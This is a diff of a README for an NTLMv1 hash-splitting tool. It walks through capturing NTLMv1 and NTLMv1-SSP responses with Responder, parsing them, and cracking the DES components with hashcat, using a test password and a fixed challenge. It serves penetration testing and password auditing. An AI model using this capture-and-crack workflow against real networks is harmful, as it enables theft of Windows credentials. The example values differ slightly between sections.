@@ -9,23 +9,130 @@ It is also based on https://hashcat.net/forum/thread-5912.html and https://www.y
 
 # Usage
 
-## NTLMv1-ESS
+## NTLMv1 without SSP
+To capture use responder with the --lm flag, without --lm you will activate SSP which requires a different tool.
+
+The capture will look like this.
 ```
-python ntlmv1-ess.py --ess "u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c"
+[SMB] NTLMv1 Client   : 184.64.60.62
+[SMB] NTLMv1 Username : DUSTIN-5AA37877\hashcat
+[SMB] NTLMv1 Hash     : hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
+[*] Skipping previously captured hash for DUSTIN-5AA37877\hashcat
 ```
 
+The hash portion looks like this
 ```
+hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
+```
+
+So use the multi tool like so
+```
+python ntlmv1.py --nossp hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
+```
+
+It will output the following data without modifing server challenges etc
+```
+['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
+
+Hostname: DUSTIN-5AA37877
+Username: hashcat
+Challenge: 1122334455667788
+LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
+NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
+CT1: 727B4E35F947129E
+CT2: A52B9CDEDAE86934
+CT3: BB23EF89F50FC595
+
+To Calculate final 4 characters of NTLM hash use:
+./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
+
+To crack with hashcat create a file with the following contents:
+727B4E35F947129E:1122334455667788
+A52B9CDEDAE86934:1122334455667788
+
+To crack with hashcat:
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+```
+
+Now the first and most important thing is the password used in this case is hashcat and we can verify the ntlm hash with
+```
+echo -n hashcat | iconv -f utf8 -t utf16le | openssl dgst -md4
+(stdin)= b4b9b02e6f09a9bd760f388b67351e2b
+```
+
+With hashcat utils ct3_to_ntlm.bin that atom wrote you can calculate the last 4 characters of the NTLM hash from the NTLMv1 challenge, which the tool outputs
+```
+./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
+568c
+```
+
+This matches up to the end of the ntlm hash so we are good to go, the next step is cracking the hashes with hashcat so we need to make a hashes.txt file with
+```
+727B4E35F947129E:1122334455667788
+A52B9CDEDAE86934:1122334455667788
+```
+
+To crack this with hashcat you use
+```
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+```
+
+Alternatively if you are just testing my code and know the password already you can use the des converter
+```
+python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
+DESKEY1: b55d6d04e67926
+DESKEY2: bcba83e6895b9d
+
+echo b55d6d04e67926>>des.cand
+echo bcba83e6895b9d>>des.cand
+```
+
+Basically you do the following
+```
+echo b55d6d04e67926>>des.cand
+echo bcba83e6895b9d>>des.cand
+```
+./hashcat -m 14000 -a 0 -1 charsets/DES_full.charset --hex-charset hashes.txt des.cand
+```
+
+And you should have some reversed hashes
+
+## NTLMv1 with SSP
+SSP changes the server challenge, if you see SSP in your responder because you didn't use --lm or the client is set not to give out a LM response then SSP gets engaged.
+
+The SSP output looks like this
+```
+[SMB] NTLMv1-SSP Client   : 184.64.60.62
+[SMB] NTLMv1-SSP Username : DUSTIN-5AA37877\hashcat
+[SMB] NTLMv1-SSP Hash     : hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
+```
+
+The actual hash looks like this
+```
+hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
+```
+
+The hashcat forums post do not use SSP, so don't try to use the SSP on on ssp hashes, you will see a stackload of zero's and thats how you can tell as the LM Response is mangled.
+
+To use the tool run
+```
+python ntlmv1-ssp.py --ssp "hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788"
+```
+
+The tool will output
+```
+Hashfield Split:
 ['hashcat', '', 'DUSTIN-5AA37877', '85D5BC2CE95161CD00000000000000000000000000000000', '892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0', '1122334455667788']
 
 Hostname: DUSTIN-5AA37877
 Username: hashcat
 LM Response: 85D5BC2CE95161CD00000000000000000000000000000000
 NT Response: 892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
-Client Challenge: 85D5BC2CE95161CD
+Client Challenge: 1122334455667788
 SRV Challenge: b36d2b9a8607ea77
 
 To Calculate final 4 characters of NTLM hash use:
-./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 85D5BC2CE95161CD 85D5BC2CE95161CD00000000000000000000000000000000
+./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000
 
 To crack with hashcat create a file with the following contents:
 892F905962F76D32:b36d2b9a8607ea77
@@ -35,59 +142,54 @@ To crack with hashcat:
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
-## NTLMv1 no ESS
+Now the password we are using in this case is hashcat which has and ntlm hash of ```b4b9b02e6f09a9bd760f388b67351e2b```
 ```
-python ntlmv1.py --noess 'hashcat::DUSTIN-5AA37877:E343946E455EFC72746CF587C42022982F85252CC731BB25:51A539E6EE061F647CD5D48CE6C686653737C5E1DE26AC4C:1122334455667788'
+echo -n hashcat | iconv -f utf8 -t utf16le | openssl dgst -md4
+(stdin)= b4b9b02e6f09a9bd760f388b67351e2b
 ```
 
+So to calculate the last 4 characters of the ntlm hash for our NTLMv1-SSP chalenge we use the following command from the tool output to get ```586c```
 ```
-Hashfield Split:
-['hashcat', '', 'DUSTIN-5AA37877', 'E343946E455EFC72746CF587C42022982F85252CC731BB25', '51A539E6EE061F647CD5D48CE6C686653737C5E1DE26AC4C', '1122334455667788']
+./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000
+```
 
-Hostname: DUSTIN-51137877
-Username: hashcat
-Challenge: 1122334455667788
-Combined: 51A539E6EE061F647CD5D48CE6C686653737C5E1DE26AC4C
-CT1: 51A539E6EE061F64
-CT2: 7CD5D48CE6C68665
-CT3: 3737C5E1DE26AC4C
+We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with ESS
+```
+892F905962F76D32:b36d2b9a8607ea77
+3837F613F88DE27C:b36d2b9a8607ea77
+```
 
-To Calculate final 4 characters of NTLM hash use:
-./ct3_to_ntlm.bin 3737C5E1DE26AC4C 1122334455667788
-
-To crack with hashcat create a file with the following contents:
-51A539E6EE061F64:1122334455667788
-7CD5D48CE6C68665:1122334455667788
-
-To crack with hashcat:
+To crack with hashcat we use the following according to the tool
+```
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
-
-## NTLMv1 JTR
+Now assuming we already knew what the ntlm hash was in the case because we made it and want to validate the tooling we use the following
 ```
-python ntlmv1-jtr.py --jtr '$NETNTLM$1122334455667788$B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233'
+python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 ```
 
+This will output some data for us
 ```
-['', 'NETNTLM', '1122334455667788', 'B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233']
+DESKEY1: b55d6d04e67926
+DESKEY2: bcba83e6895b9d
 
-Challenge: 1122334455667788
-Combined: B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233
-CT1: B2B2220790F40C88
-CT2: BCFF347C652F67A7
-CT3: C4A70D3BEBD70233
-
-To Calculate final 4 characters of NTLM hash use:
-./ct3_to_ntlm.bin C4A70D3BEBD70233 1122334455667788
-
-To crack with hashcat create a file with the following contents:
-B2B2220790F40C88:1122334455667788
-BCFF347C652F67A7:1122334455667788
-
-To crack with hashcat:
-./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+echo b55d6d04e67926>>des.cand
+echo bcba83e6895b9d>>des.cand
 ```
+
+The important part here is
+```
+echo b55d6d04e67926>>des.cand
+echo bcba83e6895b9d>>des.cand
+```
+
+Now we can crack with hashcat using the following and not waiting 8 days
+```
+./hashcat -m 14000 -a 0 -1 charsets/DES_full.charset --hex-charset hashes.txt des.cand
+```
+
+
 
 ## NTLM hash to DES Key Converter for data validation testing
 ```
